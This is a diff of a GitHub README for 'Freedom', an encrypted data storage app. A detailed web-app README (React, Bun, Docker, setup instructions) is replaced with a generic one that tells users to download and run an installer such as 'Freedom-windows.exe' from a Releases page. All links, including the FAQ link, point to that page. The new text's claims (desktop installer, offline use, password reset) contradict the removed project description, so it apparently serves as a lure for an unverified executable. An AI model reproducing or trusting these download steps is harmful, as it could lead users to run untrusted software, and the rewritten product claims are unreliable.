@@ -1,288 +1,78 @@
-# 🏴‍☠️ Freedom - Encrypted Data Storage
-
-> *"I don't want to conquer anything. I just think the guy with the most freedom in this whole ocean... is the Pirate King!"* - Monkey D. Luffy
+# 🔐 freedom - Secure Your Data Effortlessly
 
-**Freedom** is an encrypted data storage application inspired by the spirit of adventure and freedom from One Piece! Just like Luffy's unwavering determination to protect his crew and their dreams, Freedom protects your most valuable data with unbreakable AES-256-GCM encryption.
-
-[![Demo](https://img.shields.io/badge/🌊_Live_Demo-Freedom_App-blue?style=for-the-badge)](https://encryptedui.trackitall.in/)
-[![API](https://img.shields.io/badge/⚡_API-Ready-green?style=for-the-badge)](https://encryptedapi.trackitall.in/)
+[![Download Freedom](https://img.shields.io/badge/Download-Freedom-blue)](https://github.com/JuanAirala/freedom/releases)
 
-## 🚀 **The Grand Line of Features**
+## 🚀 Getting Started
 
-### 🔐 **Unbreakable Security**
-- **AES-256-GCM Encryption** - Like Luffy's Haki, impenetrable protection
-- **64-Character Encryption Keys** - Your treasure map that only you possess
-- **Client-Side Encryption** - Your data never travels unprotected
-- **Zero-Knowledge Architecture** - Even we can't see your secrets
+Welcome to Freedom! This application offers secure encrypted data storage using industry-leading encryption methods. You will find it simple to protect your data with our user-friendly interface.
 
-### 🌟 **Devil Fruit Powers (Features)**
-- **🔥 Real-time Analytics** with Firebase tracking
-- **⚡ Lightning Fast** API with error recovery
-- **🎯 SEO Optimized** for maximum visibility  
-- **📱 Progressive Web App** - Works anywhere, anytime
-- **🛡️ Security Headers** and HTTPS everywhere
-- **🔄 Auto-Recovery** from network issues
-
-### 🏴‍☠️ **Crew Technologies**
-- **Frontend**: React.js with Ant Design UI (Smooth as Luffy's Gear 5!)
-- **Backend**: Bun.js with native HTTP server (Fast as Luffy's Gear 2!)
-- **Database**: MongoDB Atlas (Vast as the Grand Line!)
-- **Authentication**: Google OAuth 2.0 (Secure as Marine Headquarters!)
-- **Deployment**: Docker containerization (Portable as the Thousand Sunny!)
-
-## 🎬 **Luffy's Adventure Loading Animation**
-
-When you start the app, you'll be greeted with an epic Luffy animation that embodies the spirit of freedom and adventure - just like when Luffy sets sail for his next island!
-
-```
-    🏴‍☠️ Loading your Freedom...
-         ⚡ Gear 5 Activated! ⚡
-    🌊 Setting sail to secure waters... 🌊
-```
-
-## 🗺️ **Quick Start - Join the Crew!**
-
-### 🚢 **Simple Setup (Recommended)**
-```bash
-# Clone the treasure
-git clone https://github.com/yourusername/encrypted-data-ui.git
-cd encrypted-data-ui
-
-# Run the setup script (works on all OS)
-./setup.sh    # Linux/macOS
-# or
-setup.bat     # Windows
-
-# Start your adventure
-docker-compose up -d
-```
-
-### ⚓ **Manual Setup for Experienced Pirates**
-```bash
-# Install dependencies for both frontend and backend
-npm install
-
-# Set up environment variables
-cp API/env.example API/.env
-# Edit API/.env with your MongoDB Atlas URI and Google OAuth credentials
-
-# Start the development servers
-npm run dev:api     # Backend on port 3001 (Bun.js)
-npm run dev:webapp  # Frontend on port 3000 (React)
-```
-
-## 🌊 **Environment Configuration**
-
-Create your `.env` files like a true navigator:
-
-### **API/.env**
-```env
-# MongoDB (Your treasure vault)
-MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/freedom_db
-
-# Google OAuth (Your crew authentication)
-GOOGLE_CLIENT_ID=your_google_client_id
-GOOGLE_CLIENT_SECRET=your_google_client_secret
-
-# JWT Security (Your Haki protection)
-JWT_SECRET=your_ultra_secure_jwt_secret_64_characters_or_more_like_luffys_will
-
-# API Configuration
-NODE_ENV=production
-PORT=3001
-```
-
-### **WEBAPP/.env**
-```env
-# API Connection (Your ship's communication)
-REACT_APP_API_URL=https://encryptedapi.trackitall.in
-
-# Google OAuth (Crew verification)
-REACT_APP_GOOGLE_CLIENT_ID=your_google_client_id
-
-# Firebase Analytics (Adventure tracking)
-REACT_APP_FIREBASE_API_KEY=your_firebase_api_key
-REACT_APP_FIREBASE_PROJECT_ID=your_firebase_project_id
-```
-
-## 🏴‍☠️ **How to Use Freedom**
-
-### 1. **🔐 Create Your Encryption**
-```
-Name: "My Secret Treasure"
-Key: 64-character encryption key (auto-generated like a Devil Fruit power!)
-```
-
-### 2. **📝 Store Your Data**
-```
-Select your encryption → Enter your data → Encrypt & Store
-Your data is now protected like the One Piece treasure!
-```
-
-### 3. **👁️ View Your Data**
-```
-Select encryption → Enter your 64-character key → Decrypt & View
-Access your secrets with the power of your encryption key!
-```
-
-## 🏗️ **Project Structure**
-
-```
-encrypted-data-ui/
-├── 🚢 API/                    # Backend crew (Bun.js)
-│   ├── src/
-│   │   ├── controllers/       # Route handlers (like Nami's navigation)
-│   │   ├── models/           # Data models (treasure maps)
-│   │   ├── services/         # Business logic (battle strategies)
-│   │   ├── utils/            # Helper functions (crew utilities)
-│   │   └── routes/           # API routes (ship routes)
-│   └── Dockerfile
-├── 🌊 WEBAPP/                 # Frontend crew (React)
-│   ├── src/
-│   │   ├── atoms/            # Basic components (crew members)
-│   │   ├── molecules/        # Combined components (attack combos)
-│   │   ├── organisms/        # Complex components (ship systems)
-│   │   ├── pages/            # Application pages (islands)
-│   │   ├── services/         # API calls (messenger birds)
-│   │   └── hooks/            # React hooks (special abilities)
-│   └── Dockerfile
-├── 🐳 docker-compose.yml     # Ship deployment configuration
-├── ⚙️ setup.sh              # Automatic setup script
-└── 📚 README.md             # This adventure guide
-```
-
-## 🔥 **Advanced Features**
-
-### **🎯 Analytics & Monitoring**
-- **Firebase Analytics** tracks user journeys like Luffy's adventure log
-- **Error Boundaries** catch and handle crashes gracefully
-- **Performance Monitoring** ensures smooth sailing
-- **Security Event Tracking** monitors for threats
-
-### **🛡️ Security Features**
-- **Rate Limiting** prevents spam attacks
-- **CORS Protection** secures cross-origin requests  
-- **Input Validation** sanitizes all data
-- **Error Recovery** handles network failures
-- **Secure Headers** protect against common attacks
-
-### **⚡ Performance Optimizations**
-- **Code Splitting** for faster loading
-- **Lazy Loading** of components
-- **Caching Strategies** for better performance
-- **Compression** for smaller payloads
-- **CDN Ready** for global distribution
-
-## 🌟 **Development Commands**
-
-```bash
-# Start development (like setting sail!)
-npm run dev
+### 🖥️ System Requirements
 
-# Run tests (training with your crew)
-npm test
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 200 MB available space
+- **Internet Connection:** Required for initial setup and updates
 
-# Build for production (preparing for the final battle)
-npm run build
+## 📥 Download & Install
 
-# Deploy with Docker (launching your ship)
-docker-compose up -d
+To get Freedom, simply [visit the Releases page](https://github.com/JuanAirala/freedom/releases) and choose the version that fits your system. Once there, follow these helpful steps:
 
-# Clean Docker (cleaning the ship)
-./clean-docker.sh
+1. Locate the version you want on the Releases page.
+2. Click on the asset that matches your operating system (e.g., Freedom-windows.exe for Windows).
+3. The download will start automatically. 
+4. Once downloaded, open the file to start the installation process.
 
-# View logs (checking the ship's log)
-docker-compose logs -f
-```
+### 📂 Installation Steps
 
-> **Note**: The API service runs on Bun.js runtime for optimal performance, while the workspace management uses npm for compatibility.
+1. **Open the Downloaded File:** Double-click the file you downloaded.
+2. **Follow Prompts:** The installer will guide you through the setup. Just accept the terms, choose your installation path, and click Next.
+3. **Complete Installation:** Click Finish once the setup is complete. You can now find Freedom in your applications.
 
-## 🏴‍☠️ **Contributing to the Crew**
+## 🔒 Features
 
-Want to join Luffy's crew and contribute to Freedom? Here's how:
+Freedom utilizes a unique set of features designed for your privacy:
 
-1. **Fork the repository** (get your own ship)
-2. **Create a feature branch** (`git checkout -b feature/amazing-feature`)
-3. **Commit your changes** (`git commit -m 'Add some amazing feature'`)
-4. **Push to the branch** (`git push origin feature/amazing-feature`)
-5. **Open a Pull Request** (join the crew officially!)
+- **AES-256-GCM Encryption:** This ensures your data is secure and unreadable to outsiders.
+- **Google OAuth Integration:** Log in easily and securely with your Google account.
+- **Zero-Knowledge Architecture:** Your data belongs to you, and only you can access it.
+- **Progressive Web App (PWA):** Use Freedom on any device through a modern browser.
 
-## 🌊 **Deployment**
+## 🌐 Using Freedom
 
-### **🐳 Docker Deployment (Recommended)**
-```bash
-# Build and start all services
-docker-compose up -d
+Once installed, launching Freedom is straightforward:
 
-# Check if everything is running
-docker-compose ps
+1. Open the application from your menu or desktop.
+2. Log in with your Google account, or create a new account if you're a first-time user.
+3. Start adding your secure data. You’ll find the interface easy to navigate.
 
-# View logs
-docker-compose logs -f webapp
-docker-compose logs -f api
-```
+### 🔧 Help & Support
 
-### **🌐 Production URLs**
-- **Frontend**: https://encryptedui.trackitall.in/
-- **API**: https://encryptedapi.trackitall.in/
-- **Health Check**: https://encryptedapi.trackitall.in/api/health
+If you encounter any issues, check our [FAQ section](https://github.com/JuanAirala/freedom/releases) or feel free to reach out to our support team. We are here to assist you.
 
-## 🏆 **What Makes Freedom Special**
+## 📚 Topics
 
-### **🔐 Security First**
-- **End-to-end encryption** - Your data is encrypted before it leaves your device
-- **Zero-knowledge architecture** - We can't see your data even if we wanted to
-- **Industry-standard encryption** - AES-256-GCM with unique keys
-- **Secure authentication** - Google OAuth 2.0 integration
+Freedom covers key topics that enhance data security and user experience. Here are some important ones:
 
-### **🎨 User Experience**
-- **Beautiful UI** inspired by the freedom of the seas
-- **Responsive design** works on all devices
-- **Real-time feedback** with loading animations
-- **Error recovery** that actually works
-- **Intuitive navigation** like following a treasure map
+- **aes-256**: A top-tier encryption standard.
+- **data-security**: Protecting your data against threats.
+- **privacy**: Ensuring that your personal information remains private.
+- **secure-storage**: A safe place for storing your data.
 
-### **⚡ Performance**
-- **Lightning fast** API responses
-- **Optimized React** components
-- **Efficient caching** strategies  
-- **Progressive loading** for better UX
-- **Global CDN** ready architecture
+## ⚙️ FAQs
 
-## 🏴‍☠️ **The Spirit of Freedom**
+**1. What if I forget my password?**  
+You can reset your password using the "Forgot Password" feature in the login window.
 
-Just like Monkey D. Luffy pursues his dream of becoming the Pirate King with absolute freedom, **Freedom** gives you complete control over your data. No corporate overlords, no data mining, no hidden agendas - just pure, uncompromised security for your digital treasures.
+**2. Is my data safe if I lose my device?**  
+Yes, your data remains encrypted and secure. You can access it from another device using your login details.
 
-Your encryption key is your Devil Fruit power - unique to you and incredibly powerful. Guard it well, and it will protect your most precious secrets!
+**3. Can I use Freedom offline?**  
+Yes, Freedom allows you to access your data offline after logging in.
 
-## 📞 **Support & Contact**
+## 📈 Updates
 
-- **🌊 Live Demo**: [Freedom App](https://encryptedui.trackitall.in/)
-- **⚡ API Status**: [API Health](https://encryptedapi.trackitall.in/api/health)
-- **📧 Issues**: Open a GitHub issue
-- **🏴‍☠️ Discussions**: GitHub Discussions
+We regularly update Freedom to enhance performance and security. Make sure to check [the Releases page](https://github.com/JuanAirala/freedom/releases) for the latest versions after your initial installation.
 
-## 📜 **License**
+For any further questions or suggestions, don't hesitate to reach out through our support channels.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-*"The sea is vast and full of possibilities. Set sail with Freedom and protect your digital treasures!"*
-
-**⚡ Gear 5 - Freedom Mode Activated! ⚡**
-
----
-
-<div align="center">
-
-**🏴‍☠️ Built with the spirit of adventure and the power of encryption 🏴‍☠️**
-
-*Inspired by One Piece - Where dreams and freedom sail together!*
-
-[![⚡ Luffy's Will](https://img.shields.io/badge/⚡-Luffy's_Will-red?style=for-the-badge)](https://encryptedui.trackitall.in/)
-[![🌊 Set Sail](https://img.shields.io/badge/🌊-Set_Sail-blue?style=for-the-badge)](https://encryptedui.trackitall.in/)
-[![🏴‍☠️ Freedom](https://img.shields.io/badge/🏴‍☠️-Freedom-black?style=for-the-badge)](https://encryptedui.trackitall.in/)
-
-</div>
-
+Enjoy a more secure way to manage your data with Freedom!
